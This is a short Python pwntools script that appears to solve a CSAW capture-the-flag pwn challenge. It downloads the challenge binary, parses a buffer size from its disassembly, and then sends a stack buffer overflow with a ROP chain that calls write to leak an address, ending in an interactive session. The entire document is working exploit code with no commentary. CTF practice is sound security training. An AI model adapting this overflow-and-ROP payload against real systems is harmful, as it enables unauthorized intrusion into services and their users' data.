from pwn import *

i=True

def fun(port,size):
    io2=remote("pwn.chal.csaw.io",port)

    write=0x00000000004005f0
    startmain=0x0000000000600ff0
    pop_rdi=0x00000000004008e3
    pop_rsi_r15=0x00000000004008e1
    #size=size-16
    payload="A"*size+p64(0x800000)+p64(pop_rdi)+p64(4)+p64(pop_rsi_r15)+p64(startmain) + p64(0) + p64(write)
    #payload="a"*(size+1)
    io2.sendline(payload)
    io2.interactive()
while(i):
    io=remote("pwn.chal.csaw.io",8888)
    port=io.recvline()
    port=int(port[-5:-1])
    open("binar","w").write(io.recvall())
    s=open("binar").read()
    a=disasm(s[2099:2110])
    print a
    first=int(a[48:52],16)
    last=a[161:]
    if(last[0:2]!="0x"):
        continue
    last=int(last,16)
    print hex(first),hex(last)
    if(last-first>=200):
        i=False
        fun(port,first)


